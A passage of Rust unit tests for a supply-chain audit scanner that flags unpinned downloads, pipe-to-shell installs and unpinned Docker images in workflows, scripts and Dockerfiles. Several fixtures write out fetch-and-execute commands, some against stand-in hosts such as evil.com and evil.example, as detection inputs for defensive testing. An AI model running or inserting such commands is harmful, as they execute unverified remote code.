    fn extract_run_blocks_recurses_into_nested_parallel() {
        // `parallel:` nested inside `parallel:` — each level is a sequence of
        // steps, walked the same way as the top-level list.
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - run: echo outer
          - parallel:
              - run: echo inner
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let runs = blocks.iter().map(|(_, run)| run.trim()).collect::<Vec<_>>();

        assert_eq!(runs, vec!["echo outer", "echo inner"]);
    }

    #[test]
    fn extract_run_blocks_flags_backgrounded_service_run() {
        // A `background: true` step keeps its `run:`, so a risky service start
        // must still be scanned.
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Start service
        run: curl https://example.com/install.sh | sh
        background: true
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in blocks {
            scan_shell_content(&run, "workflow.yml", line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_catches_pipe_to_shell_across_continuation() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://example.com/install.sh \\\n  | sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_catches_pipe_to_shell_after_pipeline_newline() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -fsSL https://example.com/releases/download/v1.2.3/install.sh |\n  bash\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_records_one_finding_when_multiple_url_patterns_match() {
        // curl and wget on one line reach the same line-level URL verdict;
        // two findings for the same line would be duplicate noise.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -O https://example.com/a.tar.gz && wget https://example.com/b.tar.gz\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_docker_pull_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "docker pull alpine:latest",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].category, "docker_unpinned");
        assert!(c.findings[0].description.contains("alpine:latest"));
    }

    #[test]
    fn shell_scan_docker_run_untagged_skips_options() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "sudo docker run --rm -v /tmp:/tmp -e FOO=bar alpine echo hi",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].category, "docker_unpinned");
        assert!(c.findings[0].description.contains("alpine"));
    }

    #[test]
    fn shell_scan_docker_run_versioned_or_digest_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "docker run alpine:3.20\ndocker pull ghcr.io/org/app@sha256:aaaaaaaa",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_docker_run_variable_images_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"docker run $MY_IMAGE echo hi
docker run "${{ matrix.image }}" echo hi"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_docker_build_and_compose_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "docker build .\ndocker compose up",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_deno_url_is_finding_when_unversioned() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "deno run --allow-net https://deno.land/x/install/mod.ts",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("deno"));
    }

    #[test]
    fn shell_scan_deno_versioned_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "deno run https://deno.land/x/tool@v1.2.3/mod.ts",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_powershell_bits_and_downloadfile_are_findings() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Start-BitsTransfer -Source https://example.com/tool.ps1 -Destination tool.ps1\n(New-Object Net.WebClient).DownloadFile('https://example.com/tool.exe', 'tool.exe')",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 2);
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("Start-BitsTransfer"))
        );
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("WebClient.DownloadFile"))
        );
    }

    #[test]
    fn shell_scan_non_literal_fetch_to_executable_is_low_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"curl -fsSL "$RELEASE_URL" -o tool"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "low");
        assert!(c.findings[0].description.contains("non-literal source"));
    }

    #[test]
    fn shell_scan_non_literal_fetch_to_data_file_is_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"curl -fsSL "$SCHEMA_URL" -o schema.json"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_non_literal_fetch_to_dev_null_or_later_pipe_redirect_is_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"curl -fsSL "$RELEASE_URL" -o /dev/null
curl -fsSL "$RELEASE_URL" | cat > tool"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pipx_and_uv_tool_unversioned_are_findings() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pipx install poetry\nuv tool install ruff",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 2);
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("pipx install"))
        );
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("uv tool install"))
        );
    }

    #[test]
    fn shell_scan_pipx_and_uv_tool_version_pinned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pipx install poetry==1.8.3\nuv tool install ruff==0.8.0",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_uvx_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "uvx ruff check .",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("uvx"));
    }

    #[test]
    fn shell_scan_uvx_version_pinned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "uvx ruff@0.8.0 check .",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_skips_comment_line_with_cargo_install() {
        // A comment documenting what a sed command matches shouldn't fire —
        // the shell never executes comment-line content.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "# Match `cargo install TOOL --locked`",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_skips_comment_line_with_curl_pipe_to_shell() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "# Example of a bad pattern: curl https://evil.com/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_unversioned_curl_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_latest_curl_emits_single_high_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
    }

    #[test]
    fn shell_scan_latest_wget_emits_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "wget https://example.com/releases/latest/tool.tar.gz",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_latest_iwr_emits_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"Invoke-WebRequest "https://example.com/releases/latest/tool""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_versioned_curl_is_allowed_in_verbose() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/v1.2.3/foo.tar.gz -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_versioned_curl_drops_allowed_when_not_verbose() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/v1.2.3/foo.tar.gz -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn js_scan_versioned_fetch_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/api/1.2.3/data");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
    }

    #[test]
    fn js_scan_unversioned_fetch_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/api/data");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn js_scan_unversioned_got_and_http_get_are_findings() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"
const a = await got("https://example.com/api/data");
http.get("http://example.com/install.sh", cb);
https.get("https://example.com/install.sh", cb);
"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 3);
        assert!(c.allowed.is_empty());
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("got() request"))
        );
        assert!(
            c.findings
                .iter()
                .any(|f| f.description.contains("http.get()"))
        );
    }

    #[test]
    fn js_scan_got_method_and_require_http_get_are_findings() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"
const a = await got.get("https://example.com/api/data");
const b = require("http").get("http://example.com/install.sh", cb);
const d = require("node:https").get("https://example.com/install.sh", cb);
"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 3);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_pipe_to_sh_versioned_still_high() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -sSL https://example.com/releases/download/v1.2.3/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1, "expected exactly one finding");
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_pipe_to_sh_not_suppressed_by_checksum() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -sSL https://example.com/install.sh | sh\nsha256sum -c checksums.txt",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // Pipe-to-shell is exempt: the payload is never written to disk, so a
        // nearby checksum cannot verify it. The finding stands at high severity.
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_pipe_to_sh_deduplicates_with_latest_pattern() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn shell_scan_proc_sub_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "bash <(curl -L https://example.com/install.sh)",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("process substitution"));
    }

    #[test]
    fn dockerfile_scan_pipe_shell_escalates_to_high() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh | sh\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn dockerfile_scan_pipe_shell_across_continuation() {
        // RUN instructions lean on backslash continuations — the fetch and
        // the pipe may sit on different physical lines.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh \\\n    | sh\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(2));
    }

    #[test]
    fn dockerfile_scan_from_platform_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM --platform=linux/amd64 node:latest\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn dockerfile_scan_add_unversioned_url_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/install.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("ADD with URL source"));
    }

    #[test]
    fn dockerfile_scan_add_versioned_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/releases/download/v1.2.3/install.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn dockerfile_scan_add_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/config.json /etc/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn dockerfile_scan_add_local_src_not_flagged() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD ./local.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_data_format_url_is_allowed_not_finding() {
        // Real Homebrew/core workflow line — regression anchor.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"DATA_30="$(curl -s https://formulae.brew.sh/api/analytics/install/homebrew-core/30d.json)""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn shell_scan_data_format_url_dropped_without_verbose() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -s https://example.com/config.yaml -o config.yaml",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_non_data_url_still_flagged() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_fetch_piped_to_jq_is_allowed_not_finding() {
        // The crates.io registry query from bump-cargo-tools.yml: an
        // extensionless JSON API piped to jq. Data, not code — no config needed.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"LATEST=$(curl -fsSL -H "$UA" "https://crates.io/api/v1/crates/${TOOL}" | jq -r '.crate.max_stable_version')"#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "piped to jq");
    }

    #[test]
    fn shell_scan_jq_exemption_does_not_cover_later_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl https://api.example.com/v1/data | jq . && curl https://evil.example/install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(
            c.findings[0]
                .description
                .contains("curl fetching URL without version pinning")
        );
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "piped to jq");
    }

    #[test]
    fn shell_scan_fetch_to_jq_then_shell_is_still_pipe_to_shell() {
        // jq anywhere in the pipeline must not downgrade a fetch that ends at a
        // shell — pipe-to-shell pre-empts and fires its own finding.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://evil.example/c | jq -r .cmd | bash",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn js_scan_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/config.json");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn py_scan_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_py_content(
            r#"r = requests.get("https://example.com/data.json")"#,
            "test.py",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
        assert_eq!(c.extra_data_format_allowed, 0);
    }

    #[test]
    fn shell_scan_honors_extra_data_formats() {
        let config = Config {
            extra_data_formats: vec!["proto".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -sSL https://example.com/api.proto -o schema.proto",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, REASON_EXTRA_DATA_FORMAT);
        assert_eq!(c.extra_data_format_allowed, 1);
    }

    #[test]
    fn shell_scan_non_configured_extension_still_flagged() {
        let config = Config {
            extra_data_formats: vec!["proto".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://artifacts.example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
        assert_eq!(c.trusted_host_allowed, 1);
    }

    #[test]
    fn shell_scan_untrusted_host_still_flagged() {
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://other.example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_trusted_host_does_not_exempt_latest() {
        // `/latest/` still fires on a trusted host — the risk is about the
        // mutable path, not about who's serving it.
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://artifacts.example.com/releases/latest/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
    }

    #[test]
    fn shell_scan_trusted_host_does_not_exempt_pipe_to_shell() {
        // Pipe-to-shell still fires on a trusted host — payload isn't
        // written to disk regardless of who's serving it.
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -sSL https://artifacts.example.com/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn js_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["api.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://api.example.com/data");"#,
            "test.js",
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn gh_release_download_without_tag_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "gh release download -R owner/repo -p '*.tar.gz'",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("gh release download"));
    }

    #[test]
    fn js_minified_line_splitting() {
        let mut c = AuditCollector::new(false);
        // A >500-char minified line with a fetch buried inside.
        let padding = "a".repeat(450);
        let minified = format!(
            r#"{}; const r = await fetch("https://example.com/api/data"); {}"#,
            padding, padding
        );
        scan_js_content(&minified, "dist/index.js", "", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_digest_pinned_skipped() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn dockerfile_from_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:latest\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_from_no_tag_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_from_named_stage_not_flagged() {
        // `FROM builder` references the stage defined above, not an image pull.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM golang:1.21 AS builder\nRUN echo build\nFROM builder\nRUN echo package\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_from_scratch_not_flagged() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM golang:1.21 AS builder\nFROM scratch\nCOPY --from=builder /app /app\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_stage_alias_collected_with_platform_flag() {
        // The stage is declared with a --platform flag; the later `FROM builder`
        // must still be recognized as a stage reference.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM --platform=$BUILDPLATFORM golang:1.21 AS builder\nFROM builder\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_untagged_base_with_stage_name_still_flagged() {
        // `FROM ubuntu AS builder` pulls untagged ubuntu (implicitly :latest);
        // naming the stage must not suppress the finding on the real base.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu AS builder\nRUN echo hi\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("FROM without tag"));
    }

    #[test]
    fn dockerfile_git_clone_followed_by_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM alpine:3.20\nRUN git clone https://github.com/org/repo /src && git -C /src checkout abcdef1234567890abcdef1234567890abcdef12\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn py_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["api.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_py_content(
            r#"r = requests.get("https://api.example.com/data")"#,
            "test.py",
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn finding_includes_action_name() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o foo",
            "test.sh",
            1,
            "actions/checkout@abc1234",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].action, "actions/checkout@abc1234");
    }

    #[test]
    fn checksum_at_boundary_of_three_lines_suppresses() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/download/tool -o tool\necho step1\necho step2\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // Checksum on the third line after the fetch still lands inside the
        // window, so the finding is suppressed and recorded as allowed.
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by checksum verification");
    }

    #[test]
